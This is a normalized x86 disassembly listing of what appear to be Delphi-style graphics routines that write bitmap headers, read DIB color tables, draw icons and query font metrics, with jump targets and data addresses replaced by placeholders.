cmp [ eax + 0xe ] 0x8
jbe r-xdata
lea eax [ ebp - 0x9c ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ ebp - 0x9c ]
push eax
push 0x54
mov eax [ ebp - 0x28 ]
push eax
call GetObjectA
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x18 ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x1c ]
mov [ ebp - 0x68 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x64 ] eax
mov eax [ ebp - 0x3c ]
mov eax [ eax + 0x24 ]
mov [ ebp - 0x60 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp sub_429cf3
mov eax [ ebp - 0x3c ]
cmp [ eax + 0x20 ] 0x0
jbe r-xdata
cmp [ ebp - 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ eax + 0x20 ]
mov edx [ ebp - 0x1c ]
xor eax eax
call sub_4254a0
mov [ ebp - 0x30 ] eax
sub_429d10
lea eax [ ebp - 0x9c ]
push eax
mov al [ ebp - 0x21 ]
push eax
mov eax [ ebp - 0x38 ]
push eax
mov ecx [ ebp - 0x30 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_4296c4
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
setne al
mov edx [ ebp - 0x4 ]
mov [ edx + 0x22 ] al
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_429d54
push ebx
push esi
push edi
add esp 0xffffff9c
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_429454
test esi esi
jne r-xdata
mov edx esp
mov ecx 0xe
mov eax edi
call sub_41c6d8
cmp [ esp ] 0x4d42
je r-xdata
lea eax [ esp + 0xe ]
xor ecx ecx
mov edx 0x54
call sub_402c40
lea eax [ esp + 0xe ]
push eax
push 0x0
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_4296c4
jmp r-xdata
push esp
mov ecx esi
sub ecx 0xe
mov edx edi
mov eax ebx
call sub_4297ec
call sub_424c90
add esp 0x64
pop edi
pop esi
pop ebx
retn
sub_429dc4
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x8 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax ebx
call sub_429454
lea eax [ ebp - 0x58 ]
xor ecx ecx
mov edx 0x54
call sub_402c40
test edi edi
je r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
lea eax [ ebp - 0x58 ]
push eax
push 0x54
push edi
call GetObjectA
mov eax [ esi + 0x10 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ esi + 0x10 ]
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
call sub_428a6c
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
push ebp
push sub_429e5f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
push 0x0
push 0x0
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_4296c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429e88
push ebx
push esi
push edi
push ebp
add esp 0xffffffac
mov ebx edx
mov esi eax
mov eax esi
call sub_429310
cmp bl al
je r-xdata
add esp 0x54
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x28 ]
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test bl bl
jne r-xdata
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
cmp bl 0x1
jne r-xdata
mov eax esi
call sub_429454
mov eax esi
call sub_429564
push esi
push edi
lea esi [ edi + 0x18 ]
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
cmp [ edi + 0x4 ] 0x1
sete bl
test bl bl
je r-xdata
cmp eax [ edi + 0x14 ]
jne r-xdata
mov eax esi
call sub_429454
mov eax esi
call sub_429564
mov eax esi
call sub_4293e0
cmp [ edi + 0x4 ] 0x1
jne r-xdata
cmp eax [ edi + 0x8 ]
je r-xdata
mov [ edi + 0x30 ] 0x28
jmp r-xdata
xor eax eax
mov [ edi + 0x30 ] eax
jmp r-xdata
mov eax [ edi + 0x10 ]
call sub_428a6c
mov ebp eax
mov ebp [ edi + 0x10 ]
jmp r-xdata
lea eax [ edi + 0x18 ]
push eax
mov ecx [ edi + 0x10 ]
mov edx [ edi + 0x14 ]
mov eax esi
call sub_428e70
jmp r-xdata
mov eax [ edi + 0x14 ]
xor edx edx
mov [ edi + 0x14 ] edx
mov ebp [ edi + 0x10 ]
xor edx edx
mov [ edi + 0x10 ] edx
lea edx [ edi + 0x18 ]
push edx
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4296c4
jmp r-xdata
push esp
mov dl [ edi + 0x70 ]
push edx
push 0x0
mov ecx ebp
mov edx eax
mov eax esi
call sub_4296c4
mov [ edi + 0x8 ] eax
jmp r-xdata
push esp
push 0x0
mov ecx ebp
mov edx [ edi + 0x10 ]
mov eax [ edi + 0x14 ]
call sub_428408
test bl bl
je r-xdata
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_429fc0
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x20 ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_429464
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x8 ] edi
mov [ esp + 0x20 ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428e70
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a014
push ebx
push esi
push edi
add esp 0xffffffac
mov ebx edx
mov edi eax
mov esi [ edi + 0x28 ]
lea eax [ esi + 0x30 ]
cmp [ eax + 0xc ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ eax + 0xe ] 0x1
je r-xdata
cmp bl al
je r-xdata
mov al 0x1
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_429464
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
xor eax eax
mov [ esp + 0x18 ] eax
xor eax eax
mov al bl
mov [ esp + 0x24 ] ax
mov [ esp + 0x26 ] ax
mov [ esp + 0x10 ] ax
mov [ esp + 0x12 ] ax
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax edi
call sub_428e70
mov edx edi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a094
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp edi [ eax + 0x10 ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi eax
test edi edi
jne r-xdata
mov eax ebx
call sub_429454
mov eax ebx
call sub_429464
push esi
push edi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
lea eax [ ebp - 0x58 ]
push eax
push 0x0
mov edx [ esi + 0x10 ]
mov eax [ esi + 0x8 ]
mov ecx edi
call sub_428408
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a12b
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x58 ]
push eax
mov al [ esi + 0x70 ]
push eax
push 0x0
mov ecx edi
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_4296c4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x4 ] 0x1
jne r-xdata
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_428300
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov eax [ esi + 0x10 ]
call sub_422d14
xor eax eax
mov [ esi + 0x10 ] eax
jmp r-xdata
sub_42a130
mov eax [ ebp - 0x4 ]
push eax
call DeleteObject
call sub_4039e8
call sub_403a3c
mov eax [ ebx + 0x28 ]
lea ecx [ eax + 0x18 ]
mov eax [ eax + 0x14 ]
mov edx edi
call sub_428300
mov [ ebx + 0x22 ] 0x1
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a168
push ebx
push esi
push edi
add esp 0xffffffac
mov edi edx
mov ebx eax
mov esi [ ebx + 0x28 ]
cmp edi [ esi + 0x1c ]
je r-xdata
add esp 0x54
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_429464
push esi
push edi
add esi 0x18
lea edi [ esp + 0x8 ]
mov ecx 0x15
[ edi ] [ esi ]
pop edi
pop esi
mov [ esp + 0x4 ] edi
mov [ esp + 0x1c ] edi
push esp
mov ecx [ esi + 0x10 ]
mov edx [ esi + 0x8 ]
mov eax ebx
call sub_428e70
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
sub_42a1c4
push ebx
push esi
push edi
push ebp
add esp 0xfffffbd4
mov ebx ecx
mov edi edx
mov esi eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c40
mov [ esp + 0x10 ] 0x4d42
mov eax [ esi + 0x28 ]
mov ebp [ eax + 0x6c ]
test ebp ebp
je r-xdata
mov eax esi
call sub_4293e0
mov ebp [ esi + 0x28 ]
xor eax eax
mov [ esp ] eax
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax ebp
mov edx [ eax ]
call [ edx ]
mov [ esp ] eax
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx [ ebp + 0x50 ]
push edx
lea ecx [ esp + 0x4 ]
lea edx [ esp + 0xc ]
call sub_425bf4
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41c710
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_41c710
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402c40
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_4292a4
mov dl [ r-xdata ]
call sub_424a8c
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_424db0
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_4283bc
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41c710
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_41c710
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_41c710
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_41c710
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_41c710
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_41c710
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_425220
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_41c710
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_425544
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_42a47c
push ebx
mov ebx eax
mov eax ebx
call sub_429464
mov edx ebx
mov eax ebx
call sub_428f30
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x8 ]
mov ecx edx
cmp edx [ eax + 0x14 ]
jne r-xdata
xor edx edx
mov [ eax + 0x8 ] edx
mov eax ecx
pop ebx
retn
xor edx edx
mov [ eax + 0x14 ] edx
xor edx edx
mov [ eax + 0x2c ] edx
sub_42a4b0
push ebx
mov ebx eax
mov eax ebx
call sub_429464
mov edx ebx
mov eax ebx
call sub_428f30
mov eax [ ebx + 0x28 ]
mov edx [ eax + 0x10 ]
xor ecx ecx
mov [ eax + 0x10 ] ecx
mov eax edx
pop ebx
retn
sub_42a4dc
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_429464
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_428408
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_42a556
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_428a6c
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42a57c
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_403234
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403224
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_42a5c4
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_425f30
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_428234
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42a618
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_428238
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41aa38
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_42a648
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033c0
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_42a920
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_428234
mov eax [ esi + 0x28 ]
call sub_428238
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_41aa64
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_42a6a8
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_424a8c
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_42a700
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_42a73c
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_41c4cc
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_41c6d8
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_4257f0
jmp r-xdata
jmp r-xdata
call sub_424c9c
sub_42a7b4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a841
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_42a700
cmp eax [ rw-data ]
jne r-xdata
call sub_424c9c
mov eax esi
call sub_42a700
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_425d34
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402c40
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41c710
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_42a868
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a8f6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_41c4ac
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_41c6d8
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_41c6d8
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_42a920
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_424c9c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a8fb
mov eax [ ebp - 0x4 ]
call sub_403234
call sub_4039e8
call sub_403a3c
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42a920
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403204
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42a960
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_428234
mov eax [ ebx + 0x28 ]
call sub_428238
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42a9e0
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_42a7b4
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_41c710
pop esi
pop ebx
retn
sub_42aa30
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_4252f0
mov [ rw-data ] eax
pop ebx
retn
sub_42aa68
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_42aaac
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_42aa68
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_42ab78
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403558
mov eax esi
pop esi
pop ebx
retn
call sub_4035b0
pop [ fs : 0x0 ]
add esp 0xc
sub_42abb0
push ebx
push esi
call sub_4035c0
mov ebx edx
mov esi eax
mov eax esi
call sub_42ada8
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a8
sub_42abf4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_42abdc
xor eax eax
push ebp
push sub_42ac95
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42ac9c
mov eax [ ebp - 0x4 ]
call sub_42abe8
retn
mov eax 0x10
call sub_40279c
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42aca8
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42aca8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_428cdc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_42ad87
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_4292a4
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_42438c
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_424270
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_419034
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_424614
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_424970
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_428f60
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ada8
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_42abdc
xor eax eax
push ebp
push sub_42adf3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42adfa
mov eax [ ebp - 0x4 ]
call sub_42abe8
retn
mov esp ebp
pop ebp
retn
sub_42adfa
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4027bc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403234
mov [ ebp - 0x8 ] eax
